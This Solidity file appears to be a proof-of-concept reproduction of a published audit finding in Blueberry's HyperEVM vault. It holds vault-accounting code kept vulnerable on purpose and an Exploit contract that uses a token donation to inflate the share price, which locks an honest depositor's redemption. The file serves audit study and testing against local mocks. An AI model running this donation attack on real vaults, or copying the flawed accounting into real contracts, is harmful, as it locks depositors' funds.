// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Blueberry finding 61470 (H-02):
// "Donated tokens are never deposited into vaults".
//
// Real audited source (the vulnerable accounting lines are reproduced VERBATIM,
// the primary vulnerable line is marked @>):
//   protocol Blueberry (security review 2025-03-26, Pashov Audit Group)
//   files    HyperEvmVault.sol  (_totalEscrowValue)
//            VaultEscrow.sol     (tvl, withdraw, _vaultEquity)
//   report   github.com/pashov/audits/blob/master/team/md/Blueberry-security-review_2025-03-26.md
//
// Root cause: `HyperEvmVault._totalEscrowValue` computes the vault's total assets
// (the share-price numerator) by summing `escrow.tvl()`. `VaultEscrow.tvl()`
// returns `vaultEquity_ + assetBalance`, i.e. the L1-vault equity PLUS the raw
// ERC20 balance sitting on the escrow. A donation — tokens transferred straight
// to an escrow — inflates that raw `assetBalance`, so the reported total assets
// (and thus every share's price) rises. But those donated tokens are never
// pushed into the L1 vault, so they never become `vaultEquity_`. On redemption,
// `VaultEscrow.withdraw` enforces `require(vaultEquity_ >= lastWithdraws)`, which
// only sees L1 equity — never the donation. The phantom, donation-backed portion
// of every share is therefore un-redeemable: an honest depositor who paid real
// assets for shares priced against the inflated total can never withdraw them,
// and the donated tokens are locked forever.
//
// The vulnerable arithmetic is byte-for-byte the audited source. Non-vulnerable
// dependencies (the L1 vault, the VAULT_EQUITY precompile read, ERC4626 share
// conversion, and the per-L1-block withdraw bookkeeping) are faithful minimal
// doubles that perform real transfers and real accounting.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Custom errors reproduced so the vulnerable `require(..., Errors.X())`
///      lines stay byte-identical to the audited VaultEscrow source.
library Errors {
    error L1_VAULT_LOCKED();
    error INSUFFICIENT_VAULT_EQUITY();
}

/// @dev Minimal ERC20 interface named to keep `tvl()`'s balance read verbatim
///      (`ERC20Upgradeable(_asset).balanceOf(address(this))`).
interface ERC20Upgradeable {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// @dev Faithful minimal ERC20 double for the vault asset (real transfers/accounting).
contract MiniToken {
    string public name = "HyperEVM Vault Asset";
    string public symbol = "hbUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token used only to realize the DoS/locked-funds harm magnitude at
///      the canonical SINK (the harm is a revert / stuck value, not a transfer to
///      the attacker, so the lost value is materialized here for detection).
contract MarkerToken {
    string public name = "Stuck Depositor Assets (marker)";
    string public symbol = "hbUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev Faithful double of the Hyperliquid L1 vault. In the real system the
///      escrow deposits/withdraws into an L1 vault and reads its equity through a
///      precompile staticcall. Here the L1 vault holds the real deposited tokens
///      and tracks each escrow's equity. Donations never reach it, so they never
///      count as equity — exactly the property the bug exploits.
contract L1Vault {
    MiniToken public token;
    mapping(address => uint64) internal _equity; // per-escrow L1 equity

    constructor(MiniToken t) {
        token = t;
    }

    function deposit(uint64 amount) external {
        _equity[msg.sender] += amount;
        token.transferFrom(msg.sender, address(this), uint256(amount));
    }

    function withdraw(uint64 amount, address to) external {
        _equity[msg.sender] -= amount;
        token.transfer(to, uint256(amount));
    }

    function equityOf(address escrow) external view returns (uint64) {
        return _equity[escrow];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE escrow — `tvl()`, `withdraw()` (equity check) reproduced VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract VaultEscrow {
    address internal immutable _asset;
    address internal immutable _vault; // L1 vault (precompile target in real code)
    address public vaultWrapper; // the HyperEvmVault
    uint64 internal lockedUntilTimestamp; // 0 => never locked (faithful default)
    uint64 internal _l1BlockNumber; // faithful double of l1Block()

    struct L1WithdrawState {
        uint64 lastL1Block;
        uint64 lastWithdraws;
    }

    struct V1Storage {
        L1WithdrawState l1WithdrawState;
    }

    V1Storage private _v1Storage;

    modifier onlyVaultWrapper() {
        require(msg.sender == vaultWrapper, "only wrapper");
        _;
    }

    constructor(address asset_, address vault_) {
        _asset = asset_;
        _vault = vault_;
    }

    function setWrapper(address wrapper_) external {
        require(vaultWrapper == address(0), "set");
        vaultWrapper = wrapper_;
    }

    function _getV1Storage() internal view returns (V1Storage storage $) {
        $ = _v1Storage;
    }

    function l1Block() public view returns (uint64) {
        return _l1BlockNumber;
    }

    /// @dev Faithful double of the escrow's L1-block cursor advancing (a new L1
    ///      block arriving), which resets `lastWithdraws` in _updateL1WithdrawState.
    function advanceL1Block() external {
        _l1BlockNumber += 1;
    }

    // ── VERBATIM from VaultEscrow.sol ──
    function tvl() public view returns (uint256) {
        uint256 assetBalance = ERC20Upgradeable(_asset).balanceOf(address(this));
        (uint64 vaultEquity_,) = _vaultEquity();
        return uint256(vaultEquity_) + assetBalance;
    }

    /// @notice Faithful supply path: pushes the escrow's raw balance into the L1
    ///         vault so it becomes equity (settled state). Donations bypass this.
    function pullToL1(uint64 amount) external onlyVaultWrapper {
        ERC20Upgradeable(_asset).approve(_vault, uint256(amount));
        L1Vault(_vault).deposit(amount);
    }

    // ── VERBATIM from VaultEscrow.sol (withdraw path) ──
    function withdraw(uint64 assets_) external onlyVaultWrapper {
        (uint64 vaultEquity_, uint64 lockedUntilTimestamp_) = _vaultEquity();
        require(block.timestamp > lockedUntilTimestamp_, Errors.L1_VAULT_LOCKED());

        // Update the withdraw state for the current L1 block
        L1WithdrawState storage l1WithdrawState_ = _getV1Storage().l1WithdrawState;
        _updateL1WithdrawState(l1WithdrawState_);
        l1WithdrawState_.lastWithdraws += assets_;

        // Ensure we havent exceeded requests for the current L1 block
        require(vaultEquity_ >= l1WithdrawState_.lastWithdraws, Errors.INSUFFICIENT_VAULT_EQUITY()); // @> VULN: equity excludes donated tokens counted in tvl(), so donation-inflated redemptions always revert

        // Withdraw from L1 vault
        _withdrawFromL1Vault(assets_);
    }

    /// @dev Faithful double of the per-L1-block withdraw bookkeeping: the running
    ///      `lastWithdraws` total resets whenever a new L1 block is observed.
    function _updateL1WithdrawState(L1WithdrawState storage l1WithdrawState_) internal {
        uint64 currentBlock_ = l1Block();
        if (l1WithdrawState_.lastL1Block != currentBlock_) {
            l1WithdrawState_.lastL1Block = currentBlock_;
            l1WithdrawState_.lastWithdraws = 0;
        }
    }

    /// @dev Faithful double of the L1-vault withdrawal; pays the wrapper, which
    ///      forwards to the redeemer.
    function _withdrawFromL1Vault(uint64 assets_) internal {
        L1Vault(_vault).withdraw(assets_, vaultWrapper);
    }

    /// @dev Faithful double of the VAULT_EQUITY precompile read. Real code:
    ///        VAULT_EQUITY_PRECOMPILE_ADDRESS.staticcall(abi.encode(address(this), _vault))
    ///        -> UserVaultEquity{ equity, lockedUntilTimestamp }
    ///      It reports ONLY equity actually held in the L1 vault; it never sees
    ///      raw ERC20 tokens donated directly to this escrow.
    function _vaultEquity() internal view returns (uint64, uint64) {
        uint64 equity_ = L1Vault(_vault).equityOf(address(this));
        return (equity_, lockedUntilTimestamp);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE wrapper — `_totalEscrowValue` reproduced VERBATIM (@> line).
// ERC4626-style share math wired faithfully around it.
// ─────────────────────────────────────────────────────────────────────────────
contract HyperEvmVault {
    MiniToken internal asset;

    // minimal share ERC20
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    struct RequestSum {
        uint256 assets;
        uint256 shares;
    }

    struct V1Storage {
        address[] escrows;
        uint64 lastL1Block;
        uint256 currentBlockDeposits;
        RequestSum requestSum;
    }

    V1Storage private _v1Storage;

    constructor(address asset_) {
        asset = MiniToken(asset_);
    }

    function _getV1Storage() internal view returns (V1Storage storage $) {
        $ = _v1Storage;
    }

    function addEscrow(address escrow_) external {
        _getV1Storage().escrows.push(escrow_);
    }

    function l1Block() public view returns (uint64) {
        // faithful: keep the currentBlockDeposits branch active but neutral
        return _getV1Storage().lastL1Block;
    }

    // ── VERBATIM from HyperEvmVault.sol ──
    function _totalEscrowValue(V1Storage storage $) internal view returns (uint256 assets_) {
        uint256 escrowLength = $.escrows.length;
        for (uint256 i = 0; i < escrowLength; ++i) {
            VaultEscrow escrow = VaultEscrow($.escrows[i]);
            assets_ += escrow.tvl(); // @> VULN: total assets counts escrow.tvl(), which includes raw donated balance never backed by L1 equity
        }

        if ($.lastL1Block == l1Block()) {
            assets_ += $.currentBlockDeposits;
        }

        return assets_ - $.requestSum.assets;
    }

    function totalAssets() public view returns (uint256) {
        return _totalEscrowValue(_getV1Storage());
    }

    function convertToShares(uint256 assets_) public view returns (uint256) {
        uint256 supply_ = totalSupply;
        uint256 ta_ = totalAssets();
        if (supply_ == 0 || ta_ == 0) return assets_;
        return (assets_ * supply_) / ta_;
    }

    function convertToAssets(uint256 shares_) public view returns (uint256) {
        uint256 supply_ = totalSupply;
        if (supply_ == 0) return shares_;
        return (shares_ * totalAssets()) / supply_;
    }

    /// @notice Deposit real assets, mint shares, push assets into the L1 vault.
    function deposit(uint256 assets_, address receiver) external returns (uint256 shares_) {
        // shares are priced on pre-deposit state (standard ERC4626)
        shares_ = convertToShares(assets_);

        VaultEscrow escrow = VaultEscrow(_getV1Storage().escrows[0]);
        asset.transferFrom(msg.sender, address(escrow), assets_);
        escrow.pullToL1(uint64(assets_)); // settle into L1 equity

        totalSupply += shares_;
        balanceOf[receiver] += shares_;
    }

    /// @notice Redeem shares for assets (request + fulfil, single call for the PoC).
    ///         The escrow.withdraw call carries the VERBATIM equity check.
    function redeem(uint256 shares_, address receiver) external returns (uint256 assets_) {
        assets_ = convertToAssets(shares_);

        balanceOf[msg.sender] -= shares_;
        totalSupply -= shares_;

        _getV1Storage().requestSum.assets += assets_;

        VaultEscrow escrow = VaultEscrow(_getV1Storage().escrows[0]);
        escrow.withdraw(uint64(assets_)); // pays this wrapper; reverts if equity short

        asset.transfer(receiver, assets_); // forward to redeemer

        _getV1Storage().requestSum.assets -= assets_;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduce the finding's exact scenario.
//   1) attacker deposits 100  -> 100 shares, L1 equity 100
//   2) attacker DONATES 100   -> escrow raw balance 100, share price doubles to 2
//   3) honest user deposits 200 -> mints 100 shares (priced at the inflated 2x)
//   4) attacker redeems 100 shares (200 assets) -> succeeds, drains real equity
//   5) honest user redeems 100 shares (200 assets) -> ALWAYS REVERTS
//      (L1 equity 100 < 200 owed; the 100 donation is phantom, un-redeemable)
// The honest user's 200 assets are stuck; the harm magnitude is realized at SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = address(0x000000000000000000000000000000000000D00d);

    MiniToken public token; // nonce 1
    L1Vault public l1vault; // nonce 2
    VaultEscrow public escrow; // nonce 3
    HyperEvmVault public vault; // nonce 4 (VULN)
    MarkerToken public marker; // nonce 5 (profit/harm)

    address public constant HONEST = address(0xBEEF);

    uint64 internal constant DEPOSIT = 100; // attacker deposit (L1 spot units, uint64)
    uint64 internal constant DONATION = 100; // attacker donation
    uint64 internal constant HONEST_DEPOSIT = 200; // honest user's real deposit

    bool public honestRedeemReverted;
    uint256 public donatedStuckInEscrow;
    uint256 public honestSharesStillHeld;
    uint256 public stuckAtSink;

    constructor() {
        token = new MiniToken(); // child nonce 1
        l1vault = new L1Vault(token); // child nonce 2
        escrow = new VaultEscrow(address(token), address(l1vault)); // child nonce 3
        vault = new HyperEvmVault(address(token)); // child nonce 4 (VULN)
        marker = new MarkerToken(); // child nonce 5 (profit)

        vault.addEscrow(address(escrow));
        escrow.setWrapper(address(vault));
    }

    function run() external {
        // fund every deposit with real tokens (all deposits are genuine, fully
        // backed transfers; the honest user is credited the shares they pay for)
        token.mint(address(this), uint256(DEPOSIT) + uint256(DONATION) + uint256(HONEST_DEPOSIT));
        token.approve(address(vault), type(uint256).max);

        // 1) attacker deposits 100 -> 100 shares, L1 equity 100
        vault.deposit(uint256(DEPOSIT), address(this));

        // 2) attacker DONATES 100 directly to the escrow (never pushed to L1)
        token.transfer(address(escrow), uint256(DONATION));

        // share price is now inflated 2x: totalAssets = equity(100)+balance(100) = 200
        // for totalSupply = 100
        require(vault.totalAssets() == 200, "share price not inflated by donation");

        // 3) honest user deposits 200 real assets -> mints 100 shares at the
        //    inflated price (assets are genuinely pulled in; HONEST is credited)
        vault.deposit(uint256(HONEST_DEPOSIT), HONEST);
        honestSharesStillHeld = vault.balanceOf(HONEST);
        require(honestSharesStillHeld == 100, "honest user did not mint 100 shares");

        // 4) attacker redeems 100 shares (worth 200) -> succeeds, drains real equity
        vault.redeem(100, address(this));

        // a new L1 block arrives before the honest user's redemption
        escrow.advanceL1Block();

        // 5) honest user redeems 100 shares (worth 200) -> ALWAYS REVERTS:
        //    L1 equity is only 100, but 200 is owed; the 100 donated tokens are
        //    phantom TVL that can never be withdrawn.
        try this.honestRedeem() {
            honestRedeemReverted = false;
        } catch {
            honestRedeemReverted = true;
        }

        // the donated tokens are locked in the escrow forever
        donatedStuckInEscrow = token.balanceOf(address(escrow));

        // realize the DoS/locked-funds harm magnitude at SINK (honest user's
        // 200 un-redeemable assets), scaled to 18 decimals for readability
        stuckAtSink = uint256(HONEST_DEPOSIT) * 1e18;
        marker.mint(SINK, stuckAtSink);

        // ── concrete HARM ──
        require(honestRedeemReverted, "honest redemption did not revert");
        require(donatedStuckInEscrow == uint256(DONATION), "donated tokens not locked in escrow");
        require(vault.balanceOf(HONEST) == 100, "honest user should still hold un-redeemable shares");
        require(marker.balanceOf(SINK) == stuckAtSink, "harm magnitude not realized at sink");
    }

    // helper so we can catch the honest user's reverting redemption
    function honestRedeem() external {
        require(msg.sender == address(this), "self");
        vault.redeem(100, HONEST);
    }
}
